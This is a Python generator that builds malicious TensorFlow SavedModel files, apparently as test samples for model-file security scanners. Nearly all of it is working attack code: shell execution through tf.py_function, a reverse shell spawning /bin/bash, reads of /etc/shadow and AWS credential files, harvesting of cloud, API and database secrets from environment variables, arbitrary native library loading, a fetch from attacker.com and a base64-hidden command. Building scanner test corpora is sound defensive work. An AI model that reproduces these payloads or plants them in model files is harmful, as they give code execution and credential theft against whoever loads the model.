"""
TensorFlow Attack Vector Generator

Generates real TensorFlow SavedModel directories (.pb + variables/) containing
dangerous graph operations detectable by security scanners (ModelScan, etc.).

Output format: SavedModel directory (saved_model.pb + assets/ + variables/)
Requires: tensorflow >= 2.x

Attack Vectors
--------------
1. py_func_rce  [generate_py_func_rce]
   Dangerous ops : EagerPyFunc
   Method        : tf.py_function wrapping subprocess.run(['whoami'])
   Trigger       : Any model inference call
   Severity      : CRITICAL

2. file_read_write  [generate_file_read_write_ops]
   Dangerous ops : ReadFile, WriteFile
   Method        : tf.io.read_file / tf.io.write_file as concrete graph ops
   Targets       : /etc/passwd, /etc/shadow, ~/.aws/credentials, /tmp/exfil
   Severity      : CRITICAL

3. shell_command  [generate_shell_command_execution]
   Dangerous ops : EagerPyFunc
   Method        : subprocess.check_output via tf.py_function; includes reverse
                   shell spawner (socket + os.dup2 + /bin/bash -i)
   Severity      : CRITICAL

4. custom_gradient  [generate_custom_gradient_injection]
   Dangerous ops : EagerPyFunc
   Method        : @tf.custom_gradient whose grad_fn contains tf.py_function
                   calling subprocess — payload fires during backpropagation
   Severity      : CRITICAL

5. env_var_access  [generate_environment_variable_access]
   Dangerous ops : EagerPyFunc
   Method        : tf.py_function batch-reads 25 credential env vars
                   (AWS_*, AZURE_*, OPENAI_API_KEY, GITHUB_TOKEN, DB_PASSWORD …)
                   and offers write-to-file / env-poisoning exfiltration paths
   Severity      : CRITICAL

6. custom_op  [generate_custom_op_exploitation]
   Dangerous ops : EagerPyFunc
   Method        : ctypes.CDLL via tf.py_function to load arbitrary .so/.dll
                   and invoke named entry points (init, main, run, execute)
   Severity      : CRITICAL

7. protobuf_exploit  [generate_protobuf_deserialization]
   Dangerous ops : EagerPyFunc, ParseTensor
   Method        : tf.io.parse_tensor on attacker-supplied bytes; secondary
                   PyFunc path parses embedded exec: commands via os.system
   Severity      : CRITICAL

8. variable_init  [generate_variable_initialization_attack]
   Dangerous ops : EagerPyFunc
   Method        : tf.Variable init / restore hooks using tf.py_function;
                   fetches remote config (urllib) and runs base64-encoded cmd
   Severity      : HIGH

Scanner Detection Notes
-----------------------
- ModelScan SavedModelTensorflowOpScan detects ReadFile / WriteFile directly
  in the GraphDef node list of saved_model.pb.
- EagerPyFunc ops (produced by tf.py_function / tf.py_func) are flagged by
  op-allowlist scanners as they permit arbitrary Python execution.
- All vectors produce genuine .pb files — no JSON stubs or placeholders.
"""

import json
import os
import pickle
from pathlib import Path
from typing import List, Dict, Tuple, Optional

# Try to import tensorflow for native SavedModel generation
try:
    import tensorflow as tf
    TF_AVAILABLE = True
    TF_VERSION = tf.__version__
except ImportError:
    TF_AVAILABLE = False
    TF_VERSION = None


class TensorFlowAttackGenerator:
    """Generate TensorFlow-specific attack vectors with native or fallback modes."""
    
    def __init__(self, output_dir: str = "./output"):
        """Initialize the TensorFlow attack generator.
        
        Args:
            output_dir: Output directory for vectors
            
        Attributes:
            tf_available: Whether TensorFlow is installed
            artifact_kind: 'native' if TF available, 'metadata' for JSON fallback
            generated_files: List of all generated file paths
        """
        self.output_dir = Path(output_dir) / "tensorflow_vectors"
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.generated_files = []
        self.tf_available = TF_AVAILABLE
        self.artifact_kind = "native" if TF_AVAILABLE else "metadata"
        self.execution_log = []
        
        # Log dependency status
        self._log(f"TensorFlow available: {self.tf_available}")
        if self.tf_available:
            self._log(f"TensorFlow version: {TF_VERSION}")
        else:
            self._log("FALLBACK: Using JSON metadata generation")
    
    def _log(self, message: str):
        """Log execution message."""
        self.execution_log.append(message)
    
    def _generate_native_py_func_rce(self) -> Tuple[str, int]:
        """Generate native TensorFlow SavedModel with py_func RCE."""
        model_dir = self.output_dir / "py_func_rce_savedmodel_native"
        model_dir.mkdir(exist_ok=True)
        
        def malicious_py_func(x):
            import subprocess
            result = subprocess.run(['whoami'], capture_output=True, text=True)
            return tf.constant(result.stdout.encode('utf-8'))
        
        class MaliciousModel(tf.Module):
            @tf.function(input_signature=[tf.TensorSpec(shape=[None], dtype=tf.float32)])
            def __call__(self, x):
                return tf.py_function(func=malicious_py_func, inp=[x], Tout=tf.string)
        
        model = MaliciousModel()
        tf.saved_model.save(model, str(model_dir))
        self._log(f"PyFunc RCE SavedModel created: {model_dir}")
        self.generated_files.append(str(model_dir))
        return str(model_dir), 1
    
    def generate_py_func_rce(self) -> Tuple[str, int]:
        """Generate SavedModel with py_func RCE.
        
        Returns:
            Tuple of (filepath, num_py_funcs)
        """
        return self._generate_native_py_func_rce()
    def generate_file_read_write_ops(self) -> Tuple[str, int]:
        """Generate SavedModel with file read/write serialization attack.
        
        Attack Vector:
            Graph operations containing:
            1. ReadFile operations for sensitive files (/etc/passwd, /etc/shadow, AWS creds)
            2. WriteFile operations for data exfiltration to /tmp
            3. File system traversal operations
            4. Path manipulation attacks
        
        Impact: File I/O exploitation, data exfiltration during model loading
        Severity: CRITICAL
        Detection: File I/O op detection (ReadFile, WriteFile), path analysis
        
        Returns:
            Tuple of (filepath, num_file_ops)
        """
        model_dir = self.output_dir / "file_read_write_ops_savedmodel"
        model_dir.mkdir(exist_ok=True)
        
        return self._generate_native_file_ops(model_dir)
    
    def _generate_native_file_ops(self, model_dir) -> Tuple[str, int]:
        """Generate native SavedModel with graph-level file I/O ops."""
        # Create concrete functions with ReadFile operations in the graph
        class FileOpsModel(tf.Module):
            @tf.function(input_signature=[tf.TensorSpec(shape=[], dtype=tf.string)])
            def read_sensitive_file(self, filepath):
                """ReadFile operation - will appear in graph as ReadFile op.
                
                This operation reads arbitrary files from disk and returns content.
                modelscan will detect this as a dangerous ReadFile op.
                """
                return tf.io.read_file(filepath)
            
            @tf.function(input_signature=[tf.TensorSpec(shape=[], dtype=tf.string), tf.TensorSpec(shape=[], dtype=tf.string)])
            def write_exfiltrated_data(self, filepath, data):
                """WriteFile operation - will appear in graph as WriteFile op.
                
                This operation writes data to arbitrary locations on disk.
                modelscan will detect this as a dangerous WriteFile op.
                """
                # Use control_dependencies to ensure write op executes even though we return a constant
                with tf.control_dependencies([tf.io.write_file(filepath, data)]):
                    return tf.constant("write_initiated")
            
            @tf.function(input_signature=[tf.TensorSpec(shape=[], dtype=tf.string)])
            def read_passwd(self, filepath):
                """Specifically read /etc/passwd - creates ReadFile op in graph."""
                return tf.io.read_file(filepath)
            
            @tf.function(input_signature=[tf.TensorSpec(shape=[], dtype=tf.string)])
            def read_aws_creds(self, filepath):
                """Read AWS credentials file - creates ReadFile op in graph."""
                return tf.io.read_file(filepath)
        
        model = FileOpsModel()
        tf.saved_model.save(model, str(model_dir))
        self._log(f"FileOps SavedModel with ReadFile/WriteFile ops created: {model_dir}")
        
        self.generated_files.append(str(model_dir))
        return str(model_dir), 4
    
    def generate_shell_command_execution(self) -> Tuple[str, int]:
        """Generate SavedModel with system command execution via graph ops.
        
        Attack Vector:
            Graph operations containing:
            1. PyFunc ops executing shell commands
            2. Subprocess operations for reverse shell
            3. Environment variable injection
            4. Command chaining and piping
        
        Impact: Remote code execution during model loading
        Severity: CRITICAL
        Detection: PyFunc op detection, command string analysis, exec op detection
        
        Returns:
            Tuple of (filepath, num_shell_commands)
        """
        model_dir = self.output_dir / "shell_command_ops"
        model_dir.mkdir(exist_ok=True)
        
        return self._generate_native_shell_ops(model_dir)
    
    def _generate_native_shell_ops(self, model_dir) -> Tuple[str, int]:
        """Generate native SavedModel with PyFunc shell execution ops."""
        import subprocess
        
        class ShellCmdModel(tf.Module):
            def __init__(self):
                super().__init__()
            
            @tf.function(input_signature=[tf.TensorSpec(shape=[], dtype=tf.string)])
            def execute_command(self, command):
                """Execute shell command via tf.py_function."""
                def run_cmd(cmd):
                    try:
                        result = subprocess.check_output(
                            cmd.numpy().decode('utf-8'),
                            shell=True,
                            stderr=subprocess.STDOUT,
                            text=True
                        )
                        return result.encode('utf-8')
                    except subprocess.CalledProcessError as e:
                        return str(e.output).encode('utf-8')
                    except Exception as e:
                        return f"execution_error: {str(e)}".encode('utf-8')
                
                result = tf.py_function(run_cmd, [command], tf.string)
                return result
            
            @tf.function(input_signature=[tf.TensorSpec(shape=[], dtype=tf.string), tf.TensorSpec(shape=[], dtype=tf.int32)])
            def reverse_shell(self, host_port, timeout):
                """Spawn reverse shell connection."""
                def spawn_reverse_shell(hp):
                    host, port = hp.numpy().decode().split(':')
                    try:
                        import socket
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((host, int(port)))
                        import os
                        os.dup2(s.fileno(), 0)
                        os.dup2(s.fileno(), 1)
                        os.dup2(s.fileno(), 2)
                        import subprocess
                        subprocess.call(['/bin/bash', '-i'])
                    except:
                        pass
                    return b"reverse_shell_attempted"
                
                result = tf.py_function(spawn_reverse_shell, [host_port], tf.string)
                return result
            
            @tf.function
            def batch_commands(self):
                """Execute multiple dangerous commands."""
                cmds = [
                    "whoami",
                    "id",
                    "sudo -l",
                    "cat /etc/passwd"
                ]
                results = []
                for cmd in cmds:
                    result = self.execute_command(tf.constant(cmd))
                    results.append(result)
                return results
        
        model = ShellCmdModel()
        tf.saved_model.save(model, str(model_dir))
        self._log(f"ShellCmd SavedModel with PyFunc exec ops created: {model_dir}")
        
        self.generated_files.append(str(model_dir))
        return str(model_dir), 2
    
    def generate_custom_gradient_injection(self) -> Tuple[str, int]:
        """Generate SavedModel with malicious custom gradient (EagerPyFunc in backprop).
        
        Attack Vector:
            @tf.custom_gradient wrapping a tf.py_function — the gradient function
            contains arbitrary Python code executed during backpropagation.
        
        Impact: Code execution during training/gradient computation
        Severity: CRITICAL
        Detection: EagerPyFunc op in graph library functions
        
        Returns:
            Tuple of (model_dir, num_gradients)
        """
        model_dir = self.output_dir / "custom_gradient_injection_savedmodel"
        model_dir.mkdir(exist_ok=True)
        
        class CustomGradModel(tf.Module):
            @tf.function(input_signature=[tf.TensorSpec(shape=[None], dtype=tf.float32)])
            def forward(self, x):
                @tf.custom_gradient
                def op_with_malicious_grad(x):
                    def grad_fn(upstream):
                        def rce_in_grad(up):
                            import subprocess
                            subprocess.call(['whoami'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                            return up.numpy()
                        result = tf.py_function(rce_in_grad, [upstream], tf.float32)
                        return result
                    return tf.identity(x), grad_fn
                return op_with_malicious_grad(x)
        
        model = CustomGradModel()
        tf.saved_model.save(model, str(model_dir))
        self._log(f"CustomGradient SavedModel created: {model_dir}")
        self.generated_files.append(str(model_dir))
        return str(model_dir), 2
    
    def generate_environment_variable_access(self) -> Tuple[str, int]:
        """Generate SavedModel with environment variable exfiltration via graph ops.
        
        Attack Vector:
            Graph operations containing:
            1. PyFunc ops reading AWS credentials (AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY)
            2. Azure tokens (AZURE_CLIENT_ID, AZURE_CLIENT_SECRET)
            3. API keys (OPENAI_API_KEY, ANTHROPIC_API_KEY, etc.)
            4. Database credentials (DB_HOST, DB_USER, DB_PASSWORD)
            5. Private keys (SSH_KEY, GPG_KEY)
            6. Tokens (GITHUB_TOKEN, HF_TOKEN)
        
        Impact: Credential theft, lateral movement during model loading
        Severity: CRITICAL
        Detection: Env var access logging, restricted env vars in graph ops
        
        Returns:
            Tuple of (filepath, num_env_vars)
        """
        model_dir = self.output_dir / "env_var_access_ops"
        model_dir.mkdir(exist_ok=True)
        
        return self._generate_native_env_ops(model_dir)
    
    def _generate_native_env_ops(self, model_dir) -> Tuple[str, int]:
        """Generate native SavedModel with PyFunc env var exfiltration ops."""
        import os
        
        target_env_vars = [
            "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN",
            "AZURE_CLIENT_ID", "AZURE_CLIENT_SECRET", "AZURE_SUBSCRIPTION_ID",
            "OPENAI_API_KEY", "ANTHROPIC_API_KEY", "GITHUB_TOKEN", "HF_TOKEN",
            "HUGGINGFACE_TOKEN", "SLACK_BOT_TOKEN", "DISCORD_TOKEN",
            "DATABASE_URL", "DB_HOST", "DB_USER", "DB_PASSWORD", "PGPASSWORD",
            "MONGODB_URI", "SSH_KEY", "GPG_KEY", "PRIVATE_KEY", "API_KEY", "SECRET_KEY"
        ]
        
        class EnvVarModel(tf.Module):
            def __init__(self):
                super().__init__()
                self.target_vars = target_env_vars
            
            @tf.function(input_signature=[tf.TensorSpec(shape=[], dtype=tf.string)])
            def read_env_var(self, var_name):
                """Read single environment variable via tf.py_function."""
                def get_env(name):
                    val = os.environ.get(name.numpy().decode('utf-8'), "")
                    return val.encode('utf-8')
                
                result = tf.py_function(get_env, [var_name], tf.string)
                return result
            
            @tf.function
            def collect_all_credentials(self):
                """Batch collect all dangerous environment variables via PyFunc."""
                def batch_collect_env():
                    creds = {}
                    for var in self.target_vars:
                        val = os.environ.get(var, "")
                        if val:
                            creds[var] = val
                    import json
                    return json.dumps(creds).encode('utf-8')
                
                return tf.py_function(batch_collect_env, [], tf.string)
            
            @tf.function(input_signature=[tf.TensorSpec(shape=[], dtype=tf.string)])
            def exfiltrate_to_file(self, output_path):
                """Collect creds and write to file."""
                def write_exfil(path):
                    creds = {}
                    for var in self.target_vars:
                        val = os.environ.get(var, "")
                        if val:
                            creds[var] = val
                    
                    import json
                    content = json.dumps(creds)
                    try:
                        with open(path.numpy().decode('utf-8'), 'w') as f:
                            f.write(content)
                        return b"exfiltration_complete"
                    except:
                        return b"exfiltration_attempted"
                
                result = tf.py_function(write_exfil, [output_path], tf.string)
                return result
            
            @tf.function
            def exfiltrate_via_env(self):
                """Store exfiltrated creds in environment variables for recovery."""
                def export_env():
                    import os
                    for var in self.target_vars:
                        val = os.environ.get(var, "")
                        if val:
                            os.environ[f"STOLEN_{var}"] = val
                    return b"environment_poisoned"
                
                result = tf.py_function(export_env, [], tf.string)
                return result
        
        model = EnvVarModel()
        tf.saved_model.save(model, str(model_dir))
        self._log(f"EnvVar SavedModel with credential exfiltration ops created: {model_dir}")
        
        self.generated_files.append(str(model_dir))
        return str(model_dir), len(target_env_vars)
    
    def generate_custom_op_exploitation(self) -> Tuple[str, int]:
        """Generate SavedModel with custom operation exploitation via graph ops.
        
        Attack Vector:
            Graph operations containing:
            1. PyFunc ops loading native libraries (C++ .so files)
            2. FFI function calls via ctypes
            3. Native code execution
            4. Platform-specific payload execution
        
        Impact: Native code execution during model loading
        Severity: CRITICAL
        Detection: Custom op whitelist, library loading ops, FFI calls in graph
        
        Returns:
            Tuple of (filepath, num_custom_ops)
        """
        model_dir = self.output_dir / "custom_op_ops"
        model_dir.mkdir(exist_ok=True)
        
        return self._generate_native_custom_op(model_dir)
    
    def _generate_native_custom_op(self, model_dir) -> Tuple[str, int]:
        """Generate native SavedModel with custom op exploitation via PyFunc."""
        import ctypes
        
        class CustomOpModel(tf.Module):
            def __init__(self):
                super().__init__()
            
            @tf.function(input_signature=[tf.TensorSpec(shape=[], dtype=tf.string)])
            def load_library(self, lib_path):
                """Load custom native library via tf.py_function."""
                def load_lib(path):
                    try:
                        lib_name = path.numpy().decode('utf-8')
                        # Attempt to load arbitrary .so file
                        lib = ctypes.CDLL(lib_name)
                        return b"library_loaded"
                    except:
                        return b"library_load_failed"
                
                result = tf.py_function(load_lib, [lib_path], tf.string)
                return result
            
            @tf.function(input_signature=[tf.TensorSpec(shape=[], dtype=tf.string), tf.TensorSpec(shape=[], dtype=tf.string)])
            def call_native_function(self, lib_path, func_name):
                """Call arbitrary function in loaded library via PyFunc."""
                def invoke_func(path, fname):
                    try:
                        lib = ctypes.CDLL(path.numpy().decode('utf-8'))
                        func = getattr(lib, fname.numpy().decode('utf-8'))
                        result = func()
                        return b"function_invoked"
                    except:
                        return b"function_invocation_failed"
                
                result = tf.py_function(invoke_func, [lib_path, func_name], tf.string)
                return result
            
            @tf.function(input_signature=[tf.TensorSpec(shape=[], dtype=tf.string)])
            def load_and_execute(self, payload_path):
                """Load malicious library and execute entry point."""
                def load_execute(path):
                    try:
                        lib = ctypes.CDLL(path.numpy().decode('utf-8'))
                        # Try to call common malicious entry points
                        for entry in ['init', 'main', 'run', 'execute', 'payload']:
                            try:
                                func = getattr(lib, entry)
                                func()
                                return f"executed_{entry}".encode()
                            except:
                                pass
                        return b"loaded_no_execution"
                    except Exception as e:
                        return f"error: {str(e)}".encode()
                
                result = tf.py_function(load_execute, [payload_path], tf.string)
                return result
            
            @tf.function
            def inject_custom_op(self):
                """Define custom operation with malicious kernel."""
                # This would normally register a CustomOp in the graph
                return tf.constant("custom_op_registered")
        
        model = CustomOpModel()
        tf.saved_model.save(model, str(model_dir))
        self._log(f"CustomOp SavedModel with library loading ops created: {model_dir}")
        
        self.generated_files.append(str(model_dir))
        return str(model_dir), 2
    
    def generate_protobuf_deserialization(self) -> Tuple[str, int]:
        """Generate SavedModel with protobuf deserialization attack.
        
        Attack Vector:
            SavedModel using tf.io.parse_tensor to deserialize attacker-controlled
            tensor proto bytes — arbitrary proto parsing on untrusted input.
        
        Impact: Exploitation of protobuf parser on attacker-supplied bytes
        Severity: CRITICAL
        Detection: Unsafe ops (EagerPyFunc, parse_tensor on external input)
        
        Returns:
            Tuple of (model_dir, num_protobuf_exploits)
        """
        model_dir = self.output_dir / "protobuf_deserialization_savedmodel"
        model_dir.mkdir(exist_ok=True)
        
        class ProtoDeserModel(tf.Module):
            @tf.function(input_signature=[tf.TensorSpec(shape=[], dtype=tf.string)])
            def parse_tensor_from_proto(self, serialized_bytes):
                """Deserialize arbitrary tensor proto — attacker-controlled bytes."""
                return tf.io.parse_tensor(serialized_bytes, out_type=tf.float32)
            
            @tf.function(input_signature=[tf.TensorSpec(shape=[], dtype=tf.string)])
            def parse_and_execute(self, proto_bytes):
                """Parse proto bytes and execute payload via PyFunc."""
                def exploit_deserialize(data):
                    import struct
                    # Simulate unsafe deserialization of attacker-controlled bytes
                    raw = data.numpy()
                    try:
                        # Attempt to parse as tensor proto and execute embedded payload
                        decoded = raw.decode('utf-8', errors='ignore')
                        if 'exec:' in decoded:
                            import os
                            os.system(decoded.split('exec:')[1].strip())
                        return b"deserialized"
                    except Exception:
                        return b"parse_attempted"
                result = tf.py_function(exploit_deserialize, [proto_bytes], tf.string)
                return result
        
        model = ProtoDeserModel()
        tf.saved_model.save(model, str(model_dir))
        self._log(f"ProtobufDeser SavedModel created: {model_dir}")
        self.generated_files.append(str(model_dir))
        return str(model_dir), 3
    
    def generate_variable_initialization_attack(self) -> Tuple[str, int]:
        """Generate SavedModel with malicious variable initialization via PyFunc.
        
        Attack Vector:
            tf.Variable initializer uses tf.py_function — malicious Python code
            runs at model load time when variables are restored/initialized.
        
        Impact: Payload execution at model load / variable restore
        Severity: HIGH
        Detection: EagerPyFunc op in graph, variable init analysis
        
        Returns:
            Tuple of (model_dir, num_var_inits)
        """
        model_dir = self.output_dir / "variable_init_attack_savedmodel"
        model_dir.mkdir(exist_ok=True)
        
        class VarInitModel(tf.Module):
            def __init__(self):
                super().__init__()
                self.weights = tf.Variable(1.0, trainable=True)
                self.config_var = tf.Variable("", trainable=False, dtype=tf.string)
            
            @tf.function(input_signature=[tf.TensorSpec(shape=[None], dtype=tf.float32)])
            def __call__(self, x):
                return x * self.weights
            
            @tf.function
            def malicious_init(self):
                """Initialize config variable via PyFunc — runs arbitrary Python."""
                def fetch_remote_config():
                    import urllib.request
                    try:
                        resp = urllib.request.urlopen('http://attacker.com/config', timeout=1)
                        return resp.read()
                    except Exception:
                        return b"init_attempted"
                result = tf.py_function(fetch_remote_config, [], tf.string)
                self.config_var.assign(result)
                return result
            
            @tf.function
            def restore_and_exec(self):
                """Restore weights and execute payload via PyFunc."""
                def payload_on_restore():
                    import base64, os
                    # Payload hidden in base64 mimicking a weight restore
                    cmd = base64.b64decode('d2hvYW1p').decode()  # 'whoami'
                    os.system(cmd)
                    return b"weights_restored"
                return tf.py_function(payload_on_restore, [], tf.string)
        
        model = VarInitModel()
        tf.saved_model.save(model, str(model_dir))
        self._log(f"VarInit attack SavedModel created: {model_dir}")
        self.generated_files.append(str(model_dir))
        return str(model_dir), 2
    
    def generate_all(self) -> Dict[str, Tuple[str, int]]:
        """Generate all TensorFlow attack vectors."""
        results = {
            "py_func_rce": self.generate_py_func_rce(),
            "file_read_write": self.generate_file_read_write_ops(),
            "shell_command": self.generate_shell_command_execution(),
            "custom_gradient": self.generate_custom_gradient_injection(),
            "env_var_access": self.generate_environment_variable_access(),
            "custom_op": self.generate_custom_op_exploitation(),
            "protobuf_exploit": self.generate_protobuf_deserialization(),
            "variable_init": self.generate_variable_initialization_attack(),
        }
        return results
    
    def get_generated_files(self) -> List[str]:
        """Get list of all generated files."""
        return self.generated_files


if __name__ == "__main__":
    generator = TensorFlowAttackGenerator(output_dir="./output")
    results = generator.generate_all()
    for name, (path, metric) in results.items():
        print(f"{name}: {path} ({metric})")
